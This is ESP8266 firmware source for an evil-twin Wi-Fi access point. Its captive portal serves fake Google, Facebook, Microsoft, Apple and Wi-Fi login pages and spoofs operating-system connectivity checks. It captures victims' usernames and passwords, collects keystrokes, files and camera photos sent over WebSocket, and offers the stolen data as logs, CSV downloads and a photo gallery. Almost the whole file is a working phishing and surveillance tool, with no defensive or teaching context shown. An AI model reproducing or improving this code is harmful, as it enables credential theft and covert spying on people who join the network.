// ==================== SPIFFS INIT ====================
bool initSPIFFS() {
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS mount failed, formatting...");
    if (!SPIFFS.format()) {
      Serial.println("SPIFFS format failed");
      return false;
    }
    Serial.println("SPIFFS formatted, retrying mount...");
    if (!SPIFFS.begin()) return false;
  }
  Serial.println("SPIFFS mounted");
  return true;
}

// ==================== LOGGING (persistent) ====================
void appendLog(String type, String data) {
  DynamicJsonDocument doc(4096);
  File f = SPIFFS.open(LOG_FILE, "r");
  if (f) {
    DeserializationError error = deserializeJson(doc, f);
    if (error) doc.to<JsonArray>(); // if corrupt, reset
    f.close();
  } else {
    doc.to<JsonArray>();
  }
  JsonArray arr = doc.as<JsonArray>();
  JsonObject entry = arr.createNestedObject();
  entry["timestamp"] = millis();
  entry["type"] = type;
  entry["data"] = data;
  while (arr.size() > MAX_LOGS) arr.remove(0);
  File out = SPIFFS.open(LOG_FILE, "w");
  if (out) {
    serializeJson(doc, out);
    out.close();
  }
}

String getLogsJSON() {
  File f = SPIFFS.open(LOG_FILE, "r");
  if (!f) return "[]";
  String s = f.readString();
  f.close();
  return s;
}

// ==================== SAVE PHOTO ====================
void savePhoto(uint8_t *payload, size_t length) {
  char fname[32];
  sprintf(fname, "/photo_%lu.jpg", millis());
  File f = SPIFFS.open(fname, "w");
  if (f) {
    f.write(payload, length);
    f.close();
    appendLog("photo", fname);
  }
}

// ==================== WEB SERVER HANDLERS ====================

void handleRoot() {
  String tmpl = server.arg("template");
  if (tmpl == "2") server.send(200, "text/html", FPSTR(login_google));
  else if (tmpl == "3") server.send(200, "text/html", FPSTR(login_facebook));
  else if (tmpl == "4") server.send(200, "text/html", FPSTR(login_microsoft));
  else if (tmpl == "5") server.send(200, "text/html", FPSTR(login_apple));
  else server.send(200, "text/html", FPSTR(login_wifi));
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");
  if (username.length() > 0) {
    String msg = "USER:" + username;
    if (password.length() > 0) msg += " (pass: " + password + ")";
    webSocket.broadcastTXT(msg);
    appendLog("credentials", msg);
    Serial.println("[Captured] " + msg);
  }
  server.sendHeader("Location", "https://www.google.com", true);
  server.send(302, "text/plain", "");
}

void handleActivate() {
  server.send(200, "text/html", FPSTR(activate_html));
}

void handleView() {
  server.send(200, "text/html", FPSTR(view_html));
}

void handleLogs() {
  if (server.arg("download") == "1") {
    String csv = "timestamp,type,data\n";
    DynamicJsonDocument doc(8192);
    File f = SPIFFS.open(LOG_FILE, "r");
    if (f) {
      deserializeJson(doc, f);
      f.close();
      JsonArray arr = doc.as<JsonArray>();
      for (JsonObject entry : arr) {
        csv += String(entry["timestamp"].as<unsigned long>()) + "," +
               entry["type"].as<String>() + "," +
               entry["data"].as<String>() + "\n";
      }
    }
    server.sendHeader("Content-Disposition", "attachment; filename=logs.csv");
    server.send(200, "text/csv", csv);
  } else {
    server.send(200, "application/json", getLogsJSON());
  }
}

void handleClear() {
  SPIFFS.remove(LOG_FILE);
  server.send(200, "text/plain", "OK");
}

void handlePhotos() {
  String html = "<html><head><title>Photos</title><style>body{background:#1c1c1e;color:#fff;font-family:sans-serif;padding:20px}</style></head><body><h2>Captured Photos</h2>";
  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    String name = dir.fileName();
    if (name.startsWith("/photo_") && name.endsWith(".jpg")) {
      html += "<div><img src='/photo?file=" + name + "' style='max-width:200px;'><br>" + name + "</div>";
    }
  }
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handlePhotoDownload() {
  String name = server.arg("file");
  if (name.length() > 0 && name.startsWith("/photo_") && name.endsWith(".jpg")) {
    if (!SPIFFS.exists(name)) { server.send(404, "text/plain", "Not found"); return; }
    File f = SPIFFS.open(name, "r");
    if (!f) { server.send(500, "text/plain", "Open error"); return; }
    server.streamFile(f, "image/jpeg");
    f.close();
  } else {
    server.send(404, "text/plain", "Invalid");
  }
}

void handleConfig() {
  if (!server.authenticate("admin", "captivesnap")) {
    return server.requestAuthentication();
  }
  if (server.method() == HTTP_POST) {
    String newSSID = server.arg("ssid");
    String newPass = server.arg("pass");
    if (newSSID.length() > 0) {
      // Store in SPIFFS for future? For demo, we just print and require reboot.
      Serial.println("New SSID: " + newSSID + ", Pass: " + newPass);
      server.send(200, "text/html", "<h2>Settings updated (will apply after reboot)</h2>");
    } else {
      server.send(400, "text/plain", "SSID required");
    }
  } else {
    String form = "<html><body><h1>AP Configuration</h1><form method='POST'>SSID: <input name='ssid' value='" + String(AP_SSID) + "'><br>Password: <input name='pass' type='password'><br><input type='submit'></form></body></html>";
    server.send(200, "text/html", form);
  }
}

void handleSpoof() { server.send(200, "text/plain", "OK"); }

void handleNotFound() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

// ==================== WEBSOCKET EVENT ====================
void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
  switch (type) {
    case WStype_DISCONNECTED: Serial.printf("[WS] %u disconnected\n", num); break;
    case WStype_CONNECTED: Serial.printf("[WS] %u connected\n", num); break;
    case WStype_TEXT: {
      String msg = String((char*)payload);
      webSocket.broadcastTXT(payload, length);
      if (msg.startsWith("TEL:")) appendLog("telemetry", msg.substring(4));
      else if (msg.startsWith("KEY:")) appendLog("keystroke", msg.substring(4));
      else if (msg.startsWith("FILE:")) appendLog("file", msg.substring(5));
      else if (msg.startsWith("USER:")) appendLog("credentials", msg.substring(5));
      else appendLog("ws_text", msg);
      Serial.printf("[WS] Text: %s\n", (char*)payload);
      break;
    }
    case WStype_BIN: {
      webSocket.broadcastBIN(payload, length);
      savePhoto(payload, length);
      Serial.printf("[WS] Binary %u bytes\n", length);
      break;
    }
  }
}

// ==================== OTA & WATCHDOG ====================
void setupOTA() { httpUpdater.setup(&server, "/update", "admin", "update"); }
void setupWatchdog() { watchdog.enable(WDT_TIMEOUT * 1000); }
void feedWatchdog() { watchdog.reset(); }

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  Serial.println("\n--- CaptiveSnap++ Ultimate starting ---");

  if (!initSPIFFS()) {
    Serial.println("SPIFFS error, continuing without persistent storage");
  }

  // Setup AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, subnet);
  if (HIDDEN_SSID) {
    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL, 1);
  } else {
    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL);
  }
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());

  // DNS
  dnsServer.start(53, "*", apIP);

  // HTTP routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/activate", HTTP_GET, handleActivate);
  server.on("/view", HTTP_GET, handleView);
  server.on("/logs", HTTP_GET, handleLogs);
  server.on("/clear", HTTP_POST, handleClear);
  server.on("/photos", HTTP_GET, handlePhotos);
  server.on("/photo", HTTP_GET, handlePhotoDownload);
  server.on("/config", HTTP_GET | HTTP_POST, handleConfig);
  // Spoof connectivity checks
  server.on("/generate_204", HTTP_GET, handleSpoof);
  server.on("/ncsi.txt", HTTP_GET, handleSpoof);
  server.on("/hotspot-detect.html", HTTP_GET, handleSpoof);
  server.on("/connecttest.txt", HTTP_GET, handleSpoof);
  server.on("/connectivity-check", HTTP_GET, handleSpoof);
  server.on("/library/test/success", HTTP_GET, handleSpoof);
  server.on("/success.txt", HTTP_GET, handleSpoof);
  server.onNotFound(handleNotFound);

  setupOTA();
  server.begin();
  Serial.println("HTTP server on port 80");

  // WebSocket
  webSocket.begin();
  webSocket.onEvent(webSocketEvent);
  Serial.println("WebSocket on port 81");

  // Watchdog
  setupWatchdog();
  Serial.println("Watchdog enabled");

  Serial.println("=== CaptiveSnap++ ready ===");
  Serial.println("SSID: " + String(AP_SSID) + (HIDDEN_SSID ? " (hidden)" : ""));
  Serial.println("Viewer: http://192.168.1.1/view");
  Serial.println("Logs: http://192.168.1.1/logs");
  Serial.println("Photos: http://192.168.1.1/photos");
  Serial.println("OTA: http://192.168.1.1/update (admin/update)");
  Serial.println("Config: http://192.168.1.1/config (admin/captivesnap)");
}

// ==================== LOOP ====================
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  webSocket.loop();
  feedWatchdog();
  delay(1);
}
